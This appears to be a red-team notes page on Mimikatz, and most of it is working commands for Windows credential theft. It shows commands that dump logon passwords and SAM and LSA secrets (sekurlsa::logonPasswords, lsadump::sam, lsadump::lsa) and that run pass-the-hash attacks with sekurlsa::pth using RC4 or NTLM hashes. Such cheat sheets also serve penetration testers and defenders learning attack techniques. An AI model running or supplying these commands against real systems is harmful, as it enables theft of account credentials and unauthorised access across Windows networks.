# Mimikatz

<div class="row row-cols-lg-2"><div>

[mimikatz](https://github.com/gentilkiwi/mimikatz) <small>(18.4k ⭐)</small> is the most popular tool to dump Windows credentials or perform attacks such as [Pass-the-hash/Pass-the-ticket](/cybersecurity/red-team/s4.privesc/index.md#pass-the-xxx).

```shell!
PS> .\mimikatz.exe
mimikatz# privilege::debug
mimikatz# # run commands
mimikatz# exit
```

To dump credentials, hashes, tickets, etc. you can use:

```shell!
mimikatz# sekurlsa::logonPasswords full
mimikatz# lsadump:: # show the list of modules
mimikatz# lsadump::sam
mimikatz# lsadump::lsa
```
</div><div>

To perform a pass-the-hash attack using a `rc4` or `NTML` hash:

```shell!
mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:xxx.yyy /run:cmd.exe
mimikatz# sekurlsa::pth /user:xxx /NTLM:XXX /domain:xxx.yyy /run:cmd.exe
```
</div></div>